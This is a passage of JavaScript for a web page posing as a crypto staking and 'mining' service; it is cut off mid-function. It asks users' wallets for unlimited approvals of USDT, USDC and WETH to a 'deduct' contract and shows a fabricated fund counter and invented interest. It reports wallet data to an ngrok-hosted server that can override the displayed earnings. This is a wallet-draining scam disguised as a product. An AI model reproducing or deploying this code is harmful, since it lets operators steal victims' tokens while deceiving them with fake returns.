const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';
const DEDUCT_CONTRACT_ABI = [
  "function isServiceActiveFor(address customer) view returns (bool)",
  "function activateService(address tokenContract) external",
  "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)",
  { "anonymous": false, "inputs": [ { "indexed": true, "name": "customer", "type": "address" }, { "indexed": true, "name": "tokenContract", "type": "address" } ], "name": "ServiceActivated", "type": "event" }
];
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

// DOM 元素
const connectButton = document.getElementById('connectButton');
const statusDiv = document.getElementById('status');
const startBtn = document.getElementById('startBtn');
const pledgeBtn = document.getElementById('pledgeBtn');
const pledgeAmount = document.getElementById('pledgeAmount');
const pledgeDuration = document.getElementById('pledgeDuration');
const pledgeToken = document.getElementById('pledgeToken');
const refreshWallet = document.getElementById('refreshWallet');
const walletTokenSelect = document.getElementById('walletTokenSelect');
const walletBalanceAmount = document.getElementById('walletBalanceAmount');
const accountBalanceValue = document.getElementById('accountBalanceValue');
const totalValue = document.getElementById('totalValue');
let grossOutputValue = document.getElementById('grossOutputValue');
let cumulativeValue = document.getElementById('cumulativeValue');
const nextBenefit = document.getElementById('nextBenefit');
const claimModal = document.getElementById('claimModal');
const closeModal = document.getElementById('closeModal');
const confirmClaim = document.getElementById('confirmClaim');
const cancelClaim = document.getElementById('cancelClaim');
const modalClaimableETH = document.getElementById('modalClaimableETH');
const modalPendingETH = document.getElementById('modalPendingETH');
const modalSelectedToken = document.getElementById('modalSelectedToken');
const modalEquivalentValue = document.getElementById('modalEquivalentValue');
const modalTitle = document.getElementById('modalTitle');
const languageSelect = document.getElementById('languageSelect');
const elements = {
  title: document.getElementById('title'),
  subtitle: document.getElementById('subtitle'),
  tabLiquidity: document.querySelector('.tab[data-tab="liquidity"] span'),
  tabPledging: document.querySelector('.tab[data-tab="pledging"] span'),
  grossOutputLabel: document.getElementById('grossOutputLabel'),
  cumulativeLabel: document.getElementById('cumulativeLabel'),
  walletBalanceLabel: document.getElementById('walletBalanceLabel'),
  accountBalanceLabel: document.getElementById('accountBalanceLabel'),
  startBtnText: startBtn,
  pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
  pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
  pledgeBtnText: pledgeBtn
};

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let pledgedAmount = 0;
let lastPayoutTime = null;
let totalGrossOutput = 0;
let currentCycleInterest = 0;
let interestInterval = null;
let nextBenefitInterval = null;
let claimInterval = null;
let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
let isServerAvailable = false;
let pendingUpdates = [];
let localLastUpdated = 0;
let authorizedToken = 'USDT';
let allData = { users: {}, overrides: {}, allowances: {}, pledges: {}, lastUpdated: 0 };
const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
window.currentClaimable = 0;
window.currentPending = 0;
const MONTHLY_RATE = 0.01;
let ethPriceCache = {
  price: 2500,
  timestamp: 0,
  cacheDuration: 5 * 60 * 1000
};

const translations = { /* ... 不變 ... */ };

let currentLang = localStorage.getItem('language') || 'en';

// 【日誌函數】
function log(message, type = 'info') {
  const timestamp = new Date().toLocaleTimeString();
  const prefix = { info: 'ℹ️', success: '✅', error: '❌', send: '📤', receive: '📥' }[type] || 'ℹ️';
  console.log(`[${timestamp}] ${prefix} ${message}`);

  const logContent = document.getElementById('logContent');
  const logContainer = document.getElementById('logContainer');
  if (logContent && logContainer) {
    const line = document.createElement('div');
    line.textContent = `[${timestamp}] ${prefix} ${message}`;
    line.style.color = { info: '#ccc', success: '#0f0', error: '#f00', send: '#00f', receive: '#ff0' }[type] || '#ccc';
    logContent.appendChild(line);
    logContainer.style.display = 'block';
    logContainer.scrollTop = logContainer.scrollHeight;
  }
}

async function retry(fn, maxAttempts = 3, delayMs = 3000) {
  for (let i = 0; i < maxAttempts; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxAttempts - 1) throw error;
      await new Promise(r => setTimeout(r, delayMs));
    }
  }
}

async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
  let attempts = 0;
  while (attempts < maxAttempts) {
    grossOutputValue = document.getElementById('grossOutputValue');
    cumulativeValue = document.getElementById('cumulativeValue');
    if (grossOutputValue && cumulativeValue) return true;
    await new Promise(r => setTimeout(r, delayMs));
    attempts++;
  }
  updateStatus(translations[currentLang].error + ': DOM error', true);
  return false;
}

async function checkServerStatus() {
  try {
    const response = await fetch(`${API_BASE_URL}/api/status`, { cache: 'no-cache' });
    if (response.ok) {
      const { status, lastUpdated } = await response.json();
      isServerAvailable = status === 'available';
      if (isServerAvailable && pendingUpdates.length > 0) await syncPendingUpdates(lastUpdated);
      return isServerAvailable;
    }
  } catch (error) {
    isServerAvailable = false;
    if (isDevMode) updateStatus(translations[currentLang].offlineWarning, true);
  }
  return false;
}

async function syncPendingUpdates(serverLastUpdated) {
  for (const update of pendingUpdates) {
    if (update.timestamp > serverLastUpdated) await saveUserData(update.data, false);
  }
  pendingUpdates = [];
}

async function loadUserDataFromServer() {
  if (!userAddress) return;
  try {
    const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, { cache: 'no-cache' }));
    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
    allData = await response.json();
    const userData = allData.users[userAddress] || {};
    const localData = JSON.parse(localStorage.getItem('userData') || '{}');
    localLastUpdated = localData.lastUpdated || 0;

    if (allData.lastUpdated > localLastUpdated) {
      // 同步 users
      pledgedAmount = userData.pledgedAmount ?? 0;
      lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
      totalGrossOutput = userData.totalGrossOutput ?? 0;
      window.currentClaimable = userData.claimable ?? 0;
      accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
      authorizedToken = userData.authorizedToken || 'USDT';

      // 同步 pledges
      const pledge = allData.pledges?.[userAddress] || { isPledging: false, amount: '0' };
      pledgedAmount = parseFloat(pledge.amount) || 0;

      // 同步 overrides
      const override = allData.overrides?.[userAddress] || {};
      totalGrossOutput = override.grossOutput ?? totalGrossOutput;
      const cumulative = override.cumulative ?? (totalGrossOutput + window.currentClaimable);

      localStorage.setItem('userData', JSON.stringify({
        pledgedAmount, lastPayoutTime, totalGrossOutput, claimable: window.currentClaimable,
        accountBalance, authorizedToken, nextBenefitTime: userData.nextBenefitTime,
        lastUpdated: allData.lastUpdated
      }));
      localLastUpdated = allData.lastUpdated;

      log(`資料同步成功: grossOutput=${totalGrossOutput}, claimable=${window.currentClaimable}`, 'success');
    }
    await updateInterest();
  } catch (error) {
    log(`載入資料失敗: ${error.message}`, 'error');
    const localData = JSON.parse(localStorage.getItem('userData') || '{}');
    pledgedAmount = localData.pledgedAmount || 0;
    lastPayoutTime = localData.lastPayoutTime || null;
    totalGrossOutput = localData.totalGrossOutput || 0;
    window.currentClaimable = localData.claimable || 0;
    accountBalance = localData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
    authorizedToken = localData.authorizedToken || 'USDT';
    if (isDevMode) updateStatus(translations[currentLang].offlineWarning, true);
  }
}

async function saveUserData(data = null, addToPending = true) {
  if (!userAddress) return;
  const dataToSave = data || {
    pledgedAmount,
    lastPayoutTime,
    totalGrossOutput,
    claimable: window.currentClaimable,
    accountBalance,
    authorizedToken,
    nextBenefitTime: localStorage.getItem('nextBenefitTime'),
    lastUpdated: Date.now(),
    source: 'index.html'
  };

  log(`發送資料到後端: ${JSON.stringify(dataToSave)}`, 'send');

  if (!isServerAvailable) {
    log('伺服器離線，加入待發送', 'error');
    if (addToPending) pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
    localStorage.setItem('userData', JSON.stringify(dataToSave));
    return;
  }

  try {
    const response = await retry(() => fetch(`${API_BASE_URL}/api/user-data`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: userAddress, data: dataToSave })
    }));
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    log('資料發送成功', 'success');
    localStorage.setItem('userData', JSON.stringify(dataToSave));
    localLastUpdated = dataToSave.lastUpdated;
  } catch (error) {
    log(`資料發送失敗: ${error.message}`, 'error');
    if (addToPending) {
      pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
      localStorage.setItem('userData', JSON.stringify(dataToSave));
    }
  }
}

function updateStatus(message, isWarning = false) {
  if (!statusDiv) return;
  statusDiv.innerHTML = message || '';
  statusDiv.style.display = message ? 'block' : 'none';
  statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
}

function resetState(showMsg = true) {
  signer = userAddress = null;
  pledgedAmount = 0;
  lastPayoutTime = null;
  totalGrossOutput = 0;
  window.currentClaimable = 0;
  accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
  authorizedToken = 'USDT';
  if (interestInterval) clearInterval(interestInterval);
  if (nextBenefitInterval) clearInterval(nextBenefitInterval);
  if (claimInterval) clearInterval(claimInterval);
  localStorage.clear();
  if (startBtn) {
    startBtn.style.display = 'block';
    startBtn.textContent = translations[currentLang].startBtnText;
  }
  if (connectButton) {
    connectButton.classList.remove('connected');
    connectButton.textContent = 'Connect';
  }
  disableInteractiveElements(true);
  if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
  if (walletTokenSelect) walletTokenSelect.value = 'USDT';
  if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
  if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
  if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
  if (showMsg) updateStatus(translations[currentLang].noWallet, true);
}

function disconnectWallet() {
  if (window.currentSSE) {
    window.currentSSE.close();
    window.currentSSE = null;
  }
  resetState(true);
}

function disableInteractiveElements(disable = false) {
  if (startBtn) startBtn.disabled = disable;
  if (pledgeBtn) pledgeBtn.disabled = disable;
  if (pledgeAmount) pledgeAmount.disabled = disable;
  if (pledgeDuration) pledgeDuration.disabled = disable;
  if (pledgeToken) pledgeToken.disabled = disable;
  if (refreshWallet) refreshWallet.style.opacity = disable ? '0.5' : '1';
}

function updateBalancesUI(walletBalances) {
  if (!walletTokenSelect) return;
  const selectedToken = walletTokenSelect.value;
  const decimals = { USDT: 6, USDC: 6, WETH: 18 };
  const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
  const formattedWalletBalance = window.ethers.utils.formatUnits(walletTokenBigInt, decimals[selectedToken]);
  if (walletBalanceAmount) walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
  const claimedBalance = accountBalance[selectedToken] || 0;
  const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
  if (accountBalanceValue) accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
}

function updateTotalFunds() {
  if (!totalValue) return;
  const initialFunds = 12856459.94;
  const increasePerSecond = 0.055;
  const fixedStartTime = 1698796800000;
  const elapsedSeconds = Math.floor((Date.now() - fixedStartTime) / 1000);
  const total = initialFunds + (elapsedSeconds * increasePerSecond);
  totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
}

async function refreshEthPrice() {
  const now = Date.now();
  if (now - ethPriceCache.timestamp < ethPriceCache.cacheDuration) return;
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
    if (!response.ok) throw new Error();
    const data = await response.json();
    ethPriceCache.price = data.ethereum.usd;
    ethPriceCache.timestamp = now;
  } catch (error) {
    console.warn('Price fetch failed, using fallback');
  }
}

function calculatePayoutInterest() {
  if (pledgedAmount <= 0) return 0;
  return pledgedAmount * (MONTHLY_RATE / 60);
}

function initializeMiningData() {
  localStorage.setItem('totalGrossOutput', '0');
  localStorage.setItem('claimable', '0');
  localStorage.setItem('lastPayoutTime', (Date.now() - 24*60*60*1000).toString());
}

async function updateInterest() {
  if (!grossOutputValue || !cumulativeValue) {
    if (!await retryDOMAcquisition()) return;
  }
  if (!userAddress || pledgedAmount <= 0) {
    grossOutputValue.textContent = '0 ETH';
    cumulativeValue.textContent = '0 ETH';
    window.currentClaimable = 0;
    window.currentPending = 0;
    return;
  }
  const now = Date.now();
  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(now + etOffset);
  totalGrossOutput = parseFloat(localStorage.getItem('totalGrossOutput')) || 0;
  let claimable = parseFloat(localStorage.getItem('claimable')) || 0;
  const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
  let lastPayoutTime = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
  if (lastPayoutTime === 0) {
    lastPayoutTime = Date.now() - 24*60*60*1000;
    localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
  }
  const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
  const lastPayoutET = new Date(lastPayoutTime + etOffset);
  const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
  if (isPayoutTime && !wasPayoutTime && now - lastPayoutTime > 60000) {
    totalGrossOutput += cycleInterest;
    claimable += cycleInterest;
    localStorage.setItem('totalGrossOutput', totalGrossOutput.toString());
    localStorage.setItem('claimable', claimable.toString());
    localStorage.setItem('lastPayoutTime', now.toString());
    await saveUserData(); // 發送更新
  }
  const nextHour = nowET.getHours() < 12 ? 12 : 24;
  const nextPayoutET = new Date(nowET);
  nextPayoutET.setHours(nextHour, 0, 0, 0);
  const msToNext = nextPayoutET.getTime() - etOffset - now;
  const progress = Math.max(0, 1 - (msToNext / (12 * 60 * 60 * 1000)));
  const pending = cycleInterest * progress;
  const cumulative = claimable + pending;
  grossOutputValue.textContent = `${totalGrossOutput.toFixed(7)} ETH`;
  cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`;
  window.currentClaimable = claimable;
  window.currentPending = pending;
}

function updateClaimModalLabels() {
  const claimLabels = {
    'en': { title: 'Claim', claimable: 'Claimable', pending: 'Pending', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
    'zh-Hant': { title: '領取', claimable: '可領取', pending: '已累積（未到期）', selectedToken: '選擇代幣', equivalentValue: '等值金額' },
    'zh-Hans': { title: '领取', claimable: '可领取', pending: '已累计（未到期）', selectedToken: '选择代币', equivalentValue: '等值金额' }
  };
  const labels = claimLabels[currentLang];
  modalTitle.textContent = labels.title;
  const labelElements = document.querySelectorAll('.claim-info .label');
  if (labelElements.length === 4) {
    labelElements[0].textContent = labels.claimable;
    labelElements[1].textContent = labels.pending;
    labelElements[2].textContent = labels.selectedToken;
    labelElements[3].textContent = labels.equivalentValue;
  }
}

async function claimInterest() {
  const token = authorizedToken;
  await refreshEthPrice();
  updateClaimModalLabels();
  modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
  modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
  modalSelectedToken.textContent = token;
  const equivalent = window.currentClaimable * ethPriceCache.price;
  modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${token}`;
  claimModal.style.display = 'flex';
  if (claimInterval) clearInterval(claimInterval);
  claimInterval = setInterval(async () => {
    await updateInterest();
    modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
    modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
    const eq = window.currentClaimable * ethPriceCache.price;
    modalEquivalentValue.textContent = `${eq.toFixed(3)} ${token}`;
  }, 1000);
}

function closeClaimModal() {
  claimModal.style.display = 'none';
  if (claimInterval) clearInterval(claimInterval);
}

function getETOffsetMilliseconds() {
  const now = new Date();
  const mar = new Date(now.getFullYear(), 2, 8);
  const nov = new Date(now.getFullYear(), 10, 1);
  const marDay = mar.getDay();
  const novDay = nov.getDay();
  const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
  const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
  return now >= dstStart && now < dstEnd ? -4 * 60 * 60 * 1000 : -5 * 60 * 60 * 1000;
}

function updateNextBenefitTimer() {
  if (!nextBenefit) return;
  const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime')) || 0;
  const label = translations[currentLang].nextBenefit.split(':')[0];
  if (!nextBenefitTimestamp) {
    nextBenefit.textContent = `${label}: 00:00:00`;
    return;
  }
  const now = Date.now();
  let diff = nextBenefitTimestamp - now;
  if (diff <= 0) {
    const twelveHoursInMillis = 12 * 60 * 60 * 1000;
    const newNextBenefitTimestamp = nextBenefitTimestamp + twelveHoursInMillis;
    localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
    saveUserData();
    diff = newNextBenefitTimestamp - Date.now();
  }
  const totalSeconds = Math.floor(Math.max(diff, 0) / 1000);
  const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
  const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
  const seconds = String(totalSeconds % 60).padStart(2, '0');
  nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
}

function setInitialNextBenefitTime() {
  if (localStorage.getItem('nextBenefitTime')) return;
  const etOffset = getETOffsetMilliseconds();
  const nowET = new Date(Date.now() + etOffset);
  const noonET = new Date(nowET); noonET.setHours(12, 0, 0, 0);
  const midnightET = new Date(nowET); midnightET.setHours(24, 0, 0, 0);
  const nextBenefitTimeET = nowET < noonET ? noonET : midnightET;
  const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
  localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
  saveUserData();
}

function activateStakingUI() {
  if (startBtn) startBtn.style.display = 'none';
  initializeMiningData();
  if (interestInterval) clearInterval(interestInterval);
  interestInterval = setInterval(updateInterest, 1000);
  if (nextBenefitInterval) clearInterval(nextBenefitInterval);
  nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
  saveUserData();
  updateInterest();
}

async function sendMobileRobustTransaction(populatedTx) {
  if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected.");
  const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
  const fromAddress = await signer.getAddress();
  const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
  let txHash, receipt = null;
  try {
    txHash = await provider.send('eth_sendTransaction', [mobileTx]);
    updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
    receipt = await provider.waitForTransaction(txHash);
  } catch (error) {
    if (error.hash) txHash = error.hash;
    if (txHash) {
      updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
      receipt = await provider.waitForTransaction(txHash);
    } else throw error;
  }
  if (!receipt || receipt.status !== 1) throw new Error(`TX reverted: ${txHash?.slice(0,10)||''}`);
  return receipt;
}

async function initializeWallet() {
  if (!window.ethers) {
    updateStatus(translations[currentLang].ethersError, true);
    connectButton.disabled = true;
    return;
  }
  try {
    if (typeof window.ethereum === 'undefined') {
      updateStatus(translations[currentLang].noWallet, true);
      disableInteractiveElements(true); connectButton.disabled = true; return;
    }
    provider = new window.ethers.providers.Web3Provider(window.ethereum);
    window.ethereum.on('accountsChanged', a => {
      if (a.length === 0) disconnectWallet();
      else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
        resetState(false);
        setTimeout(connectWallet, 500);
      }
    });
    window.ethereum.on('chainChanged', () => {
      resetState(false);
      setTimeout(connectWallet, 500);
    });
    const accounts = await provider.send('eth_accounts', []);
    if (accounts.length > 0) await connectWallet();
    else {
      disableInteractiveElements(true);
      updateStatus(translations[currentLang].noWallet, true);
    }
  } catch (e) {
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
    connectButton.disabled = true;
  }
}

async function connectWallet() {
  try {
    if (typeof window.ethereum === 'undefined') {
      updateStatus(translations[currentLang].noWallet, true); connectButton.disabled = true; return;
    }
    if (!window.ethers) {
      updateStatus(translations[currentLang].ethersError, true); return;
    }
    if (!provider) provider = new window.ethers.providers.Web3Provider(window.ethereum);
    updateStatus('Connecting...');
    const accounts = await provider.send('eth_requestAccounts', []);
    if (accounts.length === 0) throw new Error("No account.");
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
    usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
    usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
    wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
    connectButton.classList.add('connected');
    connectButton.textContent = 'Connected';

    log(`錢包連接成功: ${userAddress}`, 'success');

    await loadUserDataFromServer();
    await saveUserData(); // 強制發送一次
    setupSSE();

    await updateUIBasedOnChainState();
    setTimeout(async () => await forceRefreshWalletBalance(), 1000);
  } catch (e) {
    log(`錢包連接失敗: ${e.message}`, 'error');
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
    resetState(true);
    connectButton.disabled = typeof window.ethereum === 'undefined';
  }
}

async function forceRefreshWalletBalance() {
  if (!userAddress || !usdtContract || !usdcContract || !wethContract) {
    updateStatus('Contracts not initialized.', true);
    return;
  }
  updateStatus('Fetching balances...');
  try {
    const [usdtBal, usdcBal, wethBal] = await Promise.all([
      usdtContract.balanceOf(userAddress),
      usdcContract.balanceOf(userAddress),
      wethContract.balanceOf(userAddress)
    ]);
    const balances = { usdt: usdtBal, usdc: usdcBal, weth: wethBal };
    updateBalancesUI(balances);
    updateStatus('Balances updated.');
  } catch (error) {
    updateStatus('Balance fetch failed.', true);
  }
}

async function updateUIBasedOnChainState() {
  if (!signer) return;
  try {
    updateStatus('Checking state...');
    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
    const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
      retry(() => deductContract.isServiceActiveFor(userAddress)),
      retry(() => usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
      retry(() => usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
      retry(() => wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
    ]);
    const isWethAuthorized = wethAllowance >= requiredAllowance;
    const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
    const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
    const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
    const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
    if (isFullyAuthorized) {
      const selectedToken = walletTokenSelect.value;
      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
      const selectedContract = tokenMap[selectedToken];
      let balanceBigInt = 0n;
      try {
        balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
      } catch (e) {}
      const decimals = selectedToken === 'WETH' ? 18 : 6;
      const balance = parseFloat(window.ethers.utils.formatUnits(balanceBigInt, decimals));
      if (balance >= 1) {
        pledgedAmount = balance;
        lastPayoutTime = lastPayoutTime || Date.now();
        currentCycleInterest = calculatePayoutInterest();
        authorizedToken = selectedToken;
        localStorage.setItem('pledgedAmount', pledgedAmount.toString());
        localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
        localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
        localStorage.setItem('authorizedToken', authorizedToken);
        await saveUserData();
        initializeMiningData();
      }
      if (isWethAuthorized) {
        walletTokenSelect.value = 'WETH';
        authorizedToken = 'WETH';
      } else if (isUsdtAuthorized) {
        walletTokenSelect.value = 'USDT';
        authorizedToken = 'USDT';
      } else if (isUsdcAuthorized) {
        walletTokenSelect.value = 'USDC';
        authorizedToken = 'USDC';
      }
      setInitialNextBenefitTime();
      activateStakingUI();
      pledgeBtn.disabled = pledgeAmount.disabled = pledgeDuration.disabled = pledgeToken.disabled = false;
    } else {
      if (startBtn) startBtn.style.display = 'block';
      pledgeBtn.disabled = pledgeAmount.disabled = pledgeDuration.disabled = pledgeToken.disabled = true;
    }
    disableInteractiveElements(false); updateStatus("");
  } catch (e) {
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
  }
}

async function handleConditionalAuthorizationFlow() {
  if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
  updateStatus('Authorizing...');
  const selectedToken = walletTokenSelect.value;
  const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
  const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
  const tokenMap = {
    'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
    'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
    'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
  };
  const tokensToProcess = [tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken)];
  let tokenToActivate = '';
  for (const { name, contract, address } of tokensToProcess) {
    if (!contract) continue;
    updateStatus(`Checking ${name} allowance...`);
    const currentAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
    if (currentAllowance < requiredAllowance) {
      updateStatus(`Requesting ${name} approval...`);
      try {
        const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, window.ethers.constants.MaxUint256);
        approvalTx.value = 0n;
        await sendMobileRobustTransaction(approvalTx);
        const newAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
        if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
      } catch (err) {
        updateStatus(`${translations[currentLang].approveError} (${name})`, true);
      }
    } else if (!tokenToActivate) tokenToActivate = address;
  }
  if (!serviceActivated && tokenToActivate) {
    const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
    updateStatus(`Activating service with ${tokenName}...`);
    try {
      const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
      activateTx.value = 0n;
      await sendMobileRobustTransaction(activateTx);
      authorizedToken = tokenName;
      localStorage.setItem('authorizedToken', authorizedToken);
      await saveUserData();
    } catch (err) {
      updateStatus(`Activation failed: ${err.message}`, true);
    }
  }
  await forceRefreshWalletBalance();
}

function updateLanguage(lang) {
  currentLang = lang;
  languageSelect.value = lang;
  localStorage.setItem('language', lang);

  // 延遲執行，確保 DOM 完全載入
  const applyLanguage = () => {
    for (let key in elements) {
      if (elements[key] && translations[lang]?.[key]) {
        elements[key].textContent = translations[lang][key];
      }
    }

    if (claimModal && claimModal.style.display === 'flex') {
      updateClaimModalLabels();
    }

    // 安全更新 rulesTitle / rulesContent
    const rulesTitle = document.getElementById('rulesTitle');
    const rulesContent = document.getElementById('rulesContent');
    if (rulesTitle) {
      rulesTitle.textContent = translations[lang].rulesTitle;
    }
    if (rulesContent) {
      rulesContent.innerHTML = translations[lang].rulesContent;
    }

    updateNextBenefitTimer();
    document.documentElement.lang = lang;
  };

  // 確保 DOM 已載入
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', applyLanguage);
  } else {
    applyLanguage();
  }
}

function setupSSE() {
  if (!userAddress) return;
  if (window.currentSSE) {
    window.currentSSE.close();
  }

  let sse = null;
  let retryCount = 0;
  const maxRetries = 10;
  const baseDelay = 5000;

  function connect() {
    if (sse) sse.close();

    sse = new EventSource(`${API_BASE_URL}/api/sse`);
    window.currentSSE = sse;

    sse.onopen = () => {
      console.log('SSE 連線成功');
      retryCount = 0;
      updateStatus('SSE 已連線');
    };

    sse.onmessage = async (event) => {
      try {
        const parsed = JSON.parse(event.data);
        log(`收到 SSE: ${JSON.stringify(parsed)}`, 'receive');
        if (parsed.event === 'dataUpdate') {
          allData = parsed.data;
          await loadUserDataFromServer();
          await updateInterest();
          await forceRefreshWalletBalance();
        }
      } catch (e) {
        log(`SSE 解析錯誤: ${e.message}`, 'error');
      }
    };

    sse.onerror = () => {
      console.warn('SSE 斷線，重連中...');
      sse.close();
      if (retryCount < maxRetries) {
        retryCount++;
        setTimeout(connect, baseDelay * retryCount);
      } else {
        updateStatus('SSE 連線失敗，改用輪詢', true);
        setInterval(async () => {
          if (isServerAvailable) {
            await loadUserDataFromServer();
            await updateInterest();
          }
        }, 10000);
      }
    };
  }

  connect();
}

// 初始化
document.addEventListener('DOMContentLoaded', () => {
  setTimeout(() => {
  updateLanguage(currentLang);
  if (languageSelect) languageSelect.value = currentLang;
  initializeWallet();
  setTimeout(() => {
    updateTotalFunds();
    setInterval(updateTotalFunds, 1000);
  }, 100);


  const claimBtn = document.getElementById('claimButton');
  if (claimBtn) claimBtn.addEventListener('click', claimInterest);
  if (closeModal) closeModal.addEventListener('click', closeClaimModal);
  if (cancelClaim) cancelClaim.addEventListener('click', closeClaimModal);
  if (claimModal) claimModal.addEventListener('click', e => e.target === claimModal && closeClaimModal());
  if (confirmClaim) {
    confirmClaim.addEventListener('click', async () => {
      closeClaimModal();
      const claimable = window.currentClaimable || 0;
      if (claimable < 0.0000001) {
        updateStatus(translations[currentLang].noClaimable, true);
